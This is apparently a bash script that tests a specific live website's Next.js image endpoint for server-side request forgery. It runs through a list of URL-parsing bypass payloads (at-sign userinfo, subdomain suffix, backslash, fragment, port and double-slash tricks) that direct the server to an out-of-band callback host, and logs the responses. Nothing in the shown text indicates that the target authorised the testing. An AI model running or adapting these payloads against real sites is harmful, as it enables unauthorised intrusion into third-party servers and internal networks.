#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
B="https://www.infinitycapital.bh"
H1=ooba50a6dc7f80f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
p() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
try() { desc="$1"; raw="$2"; U=$(p "$raw"); out=$(curl -sk -o /dev/null -w "%{http_code}|%{size_download}|%{content_type}" -A "$UA" "$B/_next/image?url=$U&w=640&q=75"); echo "[$desc] $raw -> $out"; sleep 4; }

try "oob-dns-only" "$H1"
try "at-sign-userinfo" "https://images.ctfassets.net@$H1/x.png"
try "subdomain-suffix" "https://images.ctfassets.net.$H1/x.png"
try "hash-frag" "https://images.ctfassets.net/x.png#@$H1"
try "backslash" "https://images.ctfassets.net\\@$H1/x.png"
try "ctfassets-http" "http://images.ctfassets.net/x.png"
try "ctfassets-trailing-dot" "https://images.ctfassets.net./x.png"
try "double-slash" "https://images.ctfassets.net//$H1/x.png"
try "case" "https://IMAGES.CTFASSETS.NET/x.png"
try "port" "https://images.ctfassets.net:443@$H1/x.png"
try "query-redirect" "https://images.ctfassets.net/../../x.png?u=$H1"